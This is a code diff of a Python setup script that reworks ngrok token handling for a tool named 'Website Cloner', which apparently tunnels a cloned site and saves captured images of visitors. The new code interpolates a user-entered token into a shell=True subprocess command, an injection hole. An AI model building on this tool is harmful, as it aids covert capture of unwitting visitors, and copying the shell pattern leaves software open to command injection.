@@ -49,6 +49,7 @@ def setup():
     # Install requirements in virtual environment
     console.print("[yellow]Installing requirements in virtual environment...[/yellow]")
     pip_cmd = os.path.join("venv", "Scripts", "pip") if sys.platform == "win32" else os.path.join("venv", "bin", "pip")
+    python_cmd = os.path.join("venv", "Scripts", "python") if sys.platform == "win32" else os.path.join("venv", "bin", "python")
     
     # First upgrade pip
     if not run_command(f'"{pip_cmd}" install --upgrade pip'):
@@ -70,47 +71,73 @@ def setup():
             return False
         console.print(f"[green]✓[/green] {req} installed successfully")
     
-    # Setup ngrok
+    # Setup ngrok using the virtual environment's Python
     console.print("[yellow]Setting up ngrok...[/yellow]")
-    if not setup_ngrok():
-        return False
     
-    console.print("\n[bold green]Setup completed successfully![/bold green]")
-    return True
+    # Create a temporary script to setup ngrok
+    ngrok_setup_script = """
+import json
+from pyngrok import ngrok
+import sys
 
 def setup_ngrok():
-    try:
-        from pyngrok import ngrok
-    except ImportError:
-        console.print("[red]Failed to import pyngrok. Please run setup first.[/red]")
-        return False
-        
     config_file = "ngrok_config.json"
     
-    if os.path.exists(config_file):
+    if len(sys.argv) > 1:
+        # We have an auth token passed as argument
+        auth_token = sys.argv[1]
+        try:
+            ngrok.set_auth_token(auth_token)
+            with open(config_file, 'w') as f:
+                json.dump({'auth_token': auth_token}, f)
+            print("SUCCESS")
+            return
+        except:
+            print("FAILED")
+            return
+    
+    # Check existing config
+    try:
         with open(config_file, 'r') as f:
             config = json.load(f)
-            try:
-                ngrok.set_auth_token(config['auth_token'])
-                ngrok.get_tunnels()
-                console.print("[green]✓[/green] Ngrok authentication successful")
-                return True
-            except:
-                console.print("[yellow]Existing ngrok token is invalid[/yellow]")
+            ngrok.set_auth_token(config['auth_token'])
+            ngrok.get_tunnels()
+            print("SUCCESS")
+            return
+    except:
+        print("FAILED")
+        return
+
+if __name__ == '__main__':
+    setup_ngrok()
+"""
     
+    with open("ngrok_setup_temp.py", "w") as f:
+        f.write(ngrok_setup_script)
+    
+    # Try to load existing configuration first
+    result = subprocess.run(f'"{python_cmd}" ngrok_setup_temp.py', shell=True, capture_output=True, text=True)
+    if "SUCCESS" in result.stdout:
+        console.print("[green]✓[/green] Ngrok authentication successful")
+        os.remove("ngrok_setup_temp.py")
+        return True
+    
+    # If that fails, ask for new token
     while True:
         console.print("\n[bold cyan]Get your authtoken from:[/bold cyan]")
         console.print("[bold blue]https://dashboard.ngrok.com/get-started/your-authtoken[/bold blue]")
         auth_token = console.input("\n[bold yellow]Please enter your ngrok auth token: [/bold yellow]")
-        try:
-            ngrok.set_auth_token(auth_token)
-            ngrok.get_tunnels()
-            with open(config_file, 'w') as f:
-                json.dump({'auth_token': auth_token}, f)
+        
+        result = subprocess.run(f'"{python_cmd}" ngrok_setup_temp.py "{auth_token}"', shell=True, capture_output=True, text=True)
+        if "SUCCESS" in result.stdout:
             console.print("[green]✓[/green] Ngrok authentication successful")
+            os.remove("ngrok_setup_temp.py")
             return True
-        except:
+        else:
             console.print("[red]✗ Invalid auth token. Please try again.[/red]")
+    
+    os.remove("ngrok_setup_temp.py")
+    return False
 
 def main():
     try:
@@ -260,17 +287,19 @@ def main():
             console.print("\n[yellow]Captured images will be saved in: [bold]./captured_images/[/bold][/yellow]")
             console.print("\n[bold green]Server is running. Press Ctrl+C to stop.[/bold green]")
         
+        # Load ngrok config
+        config_file = "ngrok_config.json"
+        if os.path.exists(config_file):
+            with open(config_file, 'r') as f:
+                config = json.load(f)
+                ngrok.set_auth_token(config['auth_token'])
+        
         # Start the server
         console.print(Panel.fit(
             "[bold blue]Website Cloner[/bold blue]\n"
             "[cyan]Starting server...[/cyan]",
             border_style="blue"
         ))
-        
-        # Setup ngrok
-        if not os.path.exists("ngrok_config.json"):
-            if not setup_ngrok():
-                return
         
         # Start ngrok tunnel
         with console.status("[bold green]Starting ngrok tunnel..."):
